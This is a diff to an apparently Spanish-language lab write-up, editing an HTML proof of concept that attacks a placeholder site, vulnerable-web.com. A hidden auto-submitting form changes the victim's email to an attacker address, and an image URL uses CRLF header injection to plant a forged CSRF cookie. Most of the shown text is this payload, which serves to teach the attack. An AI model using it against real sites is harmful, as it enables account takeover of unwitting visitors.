@@ -105,10 +105,10 @@ Como se validaba el token en la cookie podemos mandar la peticion para el cambio
     <body>
         <form action="https://vulnerable-web.com/email/change" method="POST" >
             <input type="hidden" name="email" value="pwned@gmail.com">
-            <input type="hidden" name="csrf" value="tokenfalsojeje">
+            <input type="hidden" name="csrf" value="tokenfalso">
         </form>
 		
-        <img src="https://vulnerable-web.com/?search=hat%0d%0aSet-Cookie:%20csrf=tokenfalsojeje" onerror="document.forms[0].submit()">
+        <img src="https://vulnerable-web.com/?search=hat%0d%0aSet-Cookie:%20csrf=tokenfalso" onerror="document.forms[0].submit()">
     </body>
 </html>
 ```
